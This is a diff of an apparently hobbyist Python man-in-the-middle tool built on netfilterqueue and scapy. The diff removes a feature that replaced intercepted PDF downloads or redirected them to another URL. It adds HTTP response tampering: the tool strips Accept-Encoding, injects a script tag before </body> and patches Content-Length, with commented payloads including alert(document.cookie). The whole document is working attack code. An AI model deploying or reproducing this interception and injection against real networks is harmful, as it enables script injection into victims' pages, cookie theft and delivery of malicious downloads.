@@ -5,6 +5,8 @@ import os
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
+import re
+
 
 def getArg():
     parser = argparse.ArgumentParser("File Sniffer")
@@ -12,77 +14,51 @@ def getArg():
                         help="[?] Number of queue")
     parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=80, dest="portList", metavar="",
                         help="[?] Input target app port, you can use pool of port. Default - 80")
-    parser.add_argument("-fe", "--file-extension", type=str, nargs='+', required=False, default='pdf', dest="fileExt", metavar="",
-                        help="[?] Input which file extension catch. Default: pdf")
-    parser.add_argument("-url", "--file-url", type=str, required=False, dest="fileUrl", metavar="",
-                        help="[?] Input url on which redirect")
-    parser.add_argument("-fp", "--file-path", type=str, required=False, dest="filePath", metavar="",
-                        help="[?] Input file which send")
     parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                         help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
     parser.add_argument("-e", "--print-traceback", type=int, required=False, default=0, dest="error", metavar="",
                         help="[?] Print traceback, can extremely close the program -> use iptables --flush. "
                              "0 - No; Else Yes")
     return parser.parse_args()
-
-# url = "https://appdownload.deepl.com/windows/0install/DeepLSetup.exe"
-# path_to_pdf = r'/home/kali/Desktop/1FirstClick.pdf'
-
-url = getArg().fileUrl
-path_to_pdf = getArg().filePath
-
 def getPorts(arg):
-    port=[]
+    port = []
     if not isinstance(arg, int):
         for el in getArg().portList:
             port.append(el)
     else:
         port.append(arg)
     return port
-def getExtension():
-    extension=[]
-    for el in getArg().fileExt:
-        extension.append(el.encode())
-    return extension
 
+#" alert(document.cookie) "
+injectionScript = '<script>console.log(1)</script>'
+# injectionScript = "<script>alert(\"1\");</script>"
+#injectionScript = "<script>window.onload = function() { alert(1); };</script>"
 ack_list = []
+tag = "</body>"
+byteTag = tag.encode('utf-8')
 
-
-def fileChange(scapy_packet):
-    print("[+] Changing file...")
-
+def decodingLoad(scapy_packet):
     del scapy_packet[scapy.IP].len
     del scapy_packet[scapy.IP].chksum
     del scapy_packet[scapy.TCP].chksum
 
-
-    if getArg().fileUrl:
-        new_load = (
-            "HTTP/1.1 301 Moved Permanently\r\n"
-            f"Location: {url}\r\n"
-            "Content-Length: 0\r\n"
-            "\r\n"
-        )
-        scapy_packet[scapy.Raw].load = new_load.encode()
-
-    if getArg().filePath:
-        with open(path_to_pdf, "rb") as f:
-            new_pdf_content = f.read()
-
-        new_load = (
-            "HTTP/1.1 200 OK\r\n"
-            "Content-Type: application/pdf\r\n"
-            f"Content-Length: {len(new_pdf_content)}\r\n"
-            "Connection: close\r\n"
-            "\r\n"
-        ).encode() + new_pdf_content
-        scapy_packet[scapy.Raw].load = new_load
+    load = scapy_packet[scapy.Raw].load
+    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load.decode("utf-8"))
+    scapy_packet[scapy.Raw].load = new_load
 
     return scapy_packet
 
+
+def CI(load):
+    load = load.decode("utf-8")
+    if tag in load:
+        print("Injecting...")
+        load = load.replace(tag,  injectionScript + tag)
+    return load.encode("utf-8")
+
 def packetProccess(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+
     try:
         if scapy_packet.haslayer(scapy.Raw):
 
@@ -90,32 +66,51 @@ def packetProccess(packet):
                 load = scapy_packet[scapy.Raw].load
 
                 for port in getPorts(getArg().portList):
-                    for extension in getExtension():
 
-                        if scapy_packet[scapy.TCP].dport == port:
-                            if extension in load:
-                                print("[+] Detecting file Request")
-                                ack_list.append(scapy_packet[scapy.TCP].ack)
+                    if scapy_packet[scapy.TCP].dport == port:
+                        # print("Request", end=" ")
+
+                        new_packet = decodingLoad(scapy_packet)
+                        packet.set_payload(bytes(new_packet))
+
+                        #print(new_packet.show())
+
+                    elif scapy_packet[scapy.TCP].sport == port:
+                        # print("Response")
+
+                        if b'Content-Length' in load:
+                            contentLength = re.search(b'Content-Length:\s(\d*)', load)
+                            if contentLength:
+                                contentLengthNumber = contentLength.group(1).decode('utf-8')
+                                newContentLength = int(contentLengthNumber) + len(injectionScript)
+                                load = load.replace(contentLengthNumber.encode('utf-8'), str(newContentLength).encode('utf-8'))
+
+                        if b"<!doctype html>" in load or b"<!DOCTYPE html>" in load:
+                            ack_list.append(scapy_packet[scapy.TCP].ack)
+                            print(f"Get ack: {scapy_packet[scapy.TCP].ack}")
 
 
-                        elif scapy_packet[scapy.TCP].sport == port:
-                            if extension in load and scapy_packet[scapy.TCP].seq in ack_list:
-                                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                                print("[+] Detecting file Response")
 
-                                modifiedPacket = fileChange(scapy_packet)
 
-                                packet.set_payload(bytes(modifiedPacket))
-                                print("[+] Complete")
+                        if re.search(byteTag, load) and scapy_packet[scapy.TCP].ack in ack_list:
+                            load = CI(load)
+                            scapy_packet[scapy.Raw].load = load
+
+                            del scapy_packet[scapy.IP].len
+                            del scapy_packet[scapy.IP].chksum
+                            del scapy_packet[scapy.TCP].chksum
+
+                            packet.set_payload(bytes(scapy_packet))
+
+                            print(scapy_packet.show())
 
     except Exception as e:
         if getArg().error == 0:
             print(e)
         else:
+            subprocess.call(["iptables", "--flush"])
             print(e.with_traceback())
     packet.accept()
-
-
 
 
 def fileSnif():
@@ -133,20 +128,14 @@ def fileSnif():
         print("Usage: Public")
         print("-" * 20)
 
-    if getArg().fileUrl and getArg().filePath:
-        print("[-] Use -u or -fp flag")
-        exit()
-
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(getArg().queueNumber, packetProccess)
     queue.run()
 
+
 if __name__ == '__main__':
     try:
         print(f"Ports: {getArg().portList}")
-        print(f"Extension: {getExtension()}")
-        print(f"Url: {getArg().fileUrl}")
-        print(f"File-path: {getArg().filePath}")
         if getArg().error == 0:
             print("Traceback: No")
         else:
@@ -156,5 +145,3 @@ if __name__ == '__main__':
         subprocess.call(["iptables", "--flush"])
         print("\nDetected ctrl + C")
         exit()
-
-
